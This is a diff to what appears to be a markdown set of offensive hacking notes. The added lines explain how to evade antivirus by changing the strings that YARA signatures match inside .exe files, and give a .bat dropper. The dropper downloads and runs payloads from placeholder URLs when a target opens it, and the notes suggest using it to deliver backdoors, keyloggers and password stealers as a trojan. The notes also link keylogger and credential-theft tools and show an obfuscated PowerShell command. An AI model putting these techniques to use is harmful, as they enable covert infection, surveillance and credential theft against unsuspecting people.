@@ -432,6 +432,30 @@ by literally just adding one argument that doesn't really affect the whole code.
 ```
 powershell -w /min /b 1 -C "value.toString()'AKJHDSFIUOSAEIUHEUIFEIUOFDSOIUFSOIEOIFSOIUEFOIOEIOJEFJOOJIE'"
 ```
+
+## Bypassing All Anti-Virus Programs By Modifying Hex Vales (metod for .exe files)
+- Hex Editor
+	- https://mh-nexus.de/en/programs.php
+- Open the hex editor and look for strings and modifai them
+- But you wanna make sure you don't put more or less characters, you wanna put exactly the same amount of characters.
+- You don't even need to put spaces, you can just put characters
+- Idea: Use the yara rule that create the strings to identifi malware and modifi that strings
+
+## Generic executable that downloads & executes files
+- Ideas:
+	- Download backdoor + keylogger.
+	- Download keylogger + password recovery tool.
+	- Download keylogger + password recover tool + backdoor.
+	- Use it as  a trojan --  evil file + a normal file.
+Create this .bat file add the direct links to downloads. It will download and execute all you put in the links when targer opens the .bat file
+```
+@echo off
+
+set files='url1','url2'
+
+powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
+```
+
 ## Trojan Factory
 - https://github.com/z00z/TrojanFactory
 Installation:
@@ -463,6 +487,9 @@ python zlogger.py -i 60 -w -e email@gmail.com -p PASSWORD123 -o filename
 * on the email enable less secure app access
 ```
 The generated file is in opt/ZLogger/dist
+
+Bee Logger
+- https://github.com/4w4k3/BeeLogger
 
 ## LaZagne (retrieve lots of passwords stored on a local computer)
 - https://github.com/AlessandroZ/LaZagne
